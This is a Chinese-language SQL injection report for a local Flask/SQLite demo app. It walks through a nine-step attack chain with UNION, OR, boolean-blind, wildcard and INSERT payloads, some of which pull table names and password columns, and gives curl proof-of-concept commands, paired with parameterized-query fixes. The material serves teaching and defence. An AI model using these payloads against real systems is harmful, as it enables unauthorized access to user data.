# SQL注入漏洞 — 类型分析与修复方案报告

---

## 一、项目概述

| 项目 | 内容 |
|------|------|
| 版本 | 安全版（参数化查询） |
| 端口 | 5000 |
| 数据库 | SQLite（`data/users.db`） |
| SQL方式 | 参数化查询 `?` 占位符 |
| 密码存储 | bcrypt 哈希 |
| 安全措施 | CSRF防护 / 暴力破解限制 / 安全响应头 / 审计日志 |

---

## 二、SQL注入攻击链（9步）

```
第一步：判断是否存在注入点
  搜索框输入:  '           → 如果页面返回错误(如SQL语法错误)
  或输入:      ' OR '1'='1 → 如果返回全部数据 → 存在注入

第二步：判断注入点类型
  本项目搜索框使用 LIKE 进行字符串模糊匹配，属于字符型注入。
  验证方式：输入 ' 触发语法错误 → 确认存在字符型注入点。
  闭合方式探测：尝试 '、"、') 等，观察报错信息确定闭合符为 '。

第三步：判断闭合方式
  本例闭合方式：'（单引号）

第四步：判断列数
  ' ORDER BY 4 --  → 正常返回
  ' ORDER BY 5 --  → 报错 → 列数为 4（若5报错4正常）
  或使用 UNION SELECT NULL 逐次探测：
  ' UNION SELECT NULL --
  ' UNION SELECT NULL,NULL --
  ' UNION SELECT NULL,NULL,NULL --
  ' UNION SELECT NULL,NULL,NULL,NULL --   → 正常（4列）
  ' UNION SELECT NULL,NULL,NULL,NULL,NULL -- → 报错（超列数）

第五步：查询回显位置
  ' UNION SELECT 1,2,3,4 --
  页面显示的数字即为回显位置。本例回显位置为 2,3,4。

第六步：获取数据库名
  ' UNION SELECT 1,2,database(),4 --

第七步：获取表名（SQLite语法）
  ' UNION SELECT 1,2,group_concat(name),4 FROM sqlite_master WHERE type='table' --

第八步：获取列名
  ' UNION SELECT 1,2,group_concat(name),4 FROM pragma_table_info('users') --

第九步：获取数据
  ' UNION SELECT 1,2,password,4 FROM users --
```

---

## 三、SQL注入类型详解

### 类型①：UNION注入

**原理：** 利用 `UNION SELECT` 合并攻击者构造的查询结果。

**攻击场景：**
```
搜索框:  ' UNION SELECT 1,'inj','inj@x.com','138' --
效果:    搜索结果中出现 "inj" 用户名
```

**为何需要4列？**
```sql
-- 原查询返回4列 (id, username, email, phone)
SELECT id, username, email, phone FROM users WHERE ...
-- UNION SELECT 也必须返回4列
UNION SELECT 1, 'inj', 'inj@x.com', '138'
-- 列数不匹配会报错
```

**修复方案：**
```python
# ❌ 漏洞写法（f-string 拼接 — 本项目中已不存在）
sql = f"SELECT ... WHERE username LIKE '%{keyword}%'"

# ✅ 安全写法（参数化查询）
sql = "SELECT ... WHERE username LIKE ?"
c.execute(sql, (f"%{keyword}%",))
```

---

### 类型②：OR注入

**原理：** 利用 `OR '1'='1'` 构造永真条件。

**攻击场景：**
```
搜索框:  ' OR '1'='1
SQL:     SELECT ... WHERE username LIKE '%' OR '1'='1%'
效果:    返回数据库中所有用户
```

**在安全版中：** 参数化查询将 `' OR '1'='1` 当作普通文本值传入 LIKE 匹配，不会触发永真条件，返回"无搜索结果"。

---

### 类型③：AND布尔盲注

**原理：** 利用 `AND` 构造条件判断，根据页面是否返回数据推断数据库信息。
注意：必须使用 `--` 注释符闭合尾部 SQL，否则尾部 `%'` 会导致条件失效。

**攻击场景：**
```
条件为真:  admin' AND '1'='1' --   → 返回数据
条件为假:  admin' AND '1'='2' --   → 无数据
```

**猜解过程（以数据库名为例）：**
```
搜索:  admin' AND length(database())=4 --  → 有数据 → 库名长度=4
搜索:  admin' AND substr(database(),1,1)='m' --  → 有数据 → 首字母'm'
搜索:  admin' AND substr(database(),2,1)='a' --  → 有数据 → 第二字母'a'
...逐个猜解直至完整 → "main"
```

---

### 类型④：LIKE通配符注入

**原理：** LIKE 支持 `%`（匹配任意多字符）和 `_`（匹配单个字符）通配符。

**攻击场景：**
```
%       → 返回全部用户（当keyword=%，LIKE '%%'匹配所有行）
%a%     → 返回所有包含字母a的用户
admin_  → 返回admin开头+1个字符的用户
```

**修复方案：** 如需防止通配符，可转义：
```python
keyword = keyword.replace("%", "\\%").replace("_", "\\_")
```

---

### 类型⑤：INSERT注入

**原理：** 在注册表单字段中插入 SQL 代码，闭合 INSERT 语句。

**攻击场景：**
```
用户名:   hacker', 'hack123', 'h@x.com', '999') --
密码:     irrelevant (被注释掉)
效果:     ) -- 注释掉后续SQL，插入伪造数据
```

**修复方案（本项目的做法）：**
```python
# 参数化查询，用户输入只作为参数值传入
sql = "INSERT INTO users VALUES (?, ?, ?, ?)"
c.execute(sql, (username, password, email, phone))
```

---

## 四、代码对比（漏洞版 vs 安全版）

### 搜索功能

| 维度 | 漏洞写法（演示用） | 安全写法（本项目） |
|------|-------------------|-------------------|
| SQL构建 | `f"...LIKE '%{keyword}%'"` | `"...LIKE ?"` |
| 用户输入 | 拼接为SQL代码 | 作为参数传入 |
| `' OR '1'='1` | 变为永真条件 | 当作普通文本 |
| `' UNION SELECT...` | 合并到结果 | 当作普通文本 |
| 数据库执行 | `c.execute(sql)` | `c.execute(sql, params)` |

### 注册功能

| 维度 | 漏洞写法 | 安全写法 |
|------|---------|---------|
| SQL构建 | `f"VALUES ('{username}')"` | `"VALUES (?)"` |
| 闭合注入 | `hacker')--` 可闭合 | 参数化无法闭合 |
| 密码存储 | 明文 | bcrypt 哈希 |

---

## 五、POC 测试命令

```bash
# 登录获取 session
CSRF=$(curl -s -c /tmp/c.txt http://localhost:5000/login | grep -oP 'name="_csrf_token" value="\K[^"]+')
curl -s -b /tmp/c.txt -c /tmp/c.txt \
  -d "username=admin&password=admin123&_csrf_token=$CSRF" \
  http://localhost:5000/login -L -o /dev/null

# ──────────── 漏洞版验证（如仍部署）────────────
# POC 1：UNION 注入
curl -b /tmp/c.txt \
  "http://localhost:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--"

# POC 2：OR 注入
curl -b /tmp/c.txt \
  "http://localhost:5000/search?keyword=%27%20OR%20%271%27%3D%271"

# ──────────── 安全版验证（应全部失败）────────────
echo "=== 安全版验证（注入应被拦截）==="
curl -b /tmp/c.txt "http://localhost:5000/search?keyword=%27%20OR%20%271%27%3D%271"
# 预期结果：无搜索结果（注入被拦截）

curl -b /tmp/c.txt \
  "http://localhost:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--"
# 预期结果：无搜索结果（注入被拦截）
```

---

## 六、防御方案对比

| 防御措施 | 效果 | 实现成本 | 推荐度 |
|----------|------|----------|:------:|
| **参数化查询 `?`** | 彻底杜绝注入 | 低 | ⭐⭐⭐⭐⭐ |
| 输入过滤/转义 | 可能被绕过 | 中 | ⭐⭐⭐ |
| WAF | 可被绕过 | 高 | ⭐⭐ |
| ORM框架 | 内置防护 | 低 | ⭐⭐⭐⭐⭐ |
| 最小权限原则 | 减少损失 | 低 | ⭐⭐⭐⭐ |

---

## 七、修复铁律

```
┌──────────────────────────────────────────┐
│              SQL注入防御铁律              │
│                                          │
│  ❌ 永远不要用 f-string 拼接 SQL         │
│  ❌ 永远不要相信用户输入                  │
│  ✅ 始终使用参数化查询 ? 占位符          │
│  ✅ 最小权限原则（不用 root 连库）       │
│  ✅ 错误信息不暴露给用户                  │
└──────────────────────────────────────────┘
```

---

*报告生成日期：2026-07-08*
*项目地址：https://github.com/na-asuka/second-day*
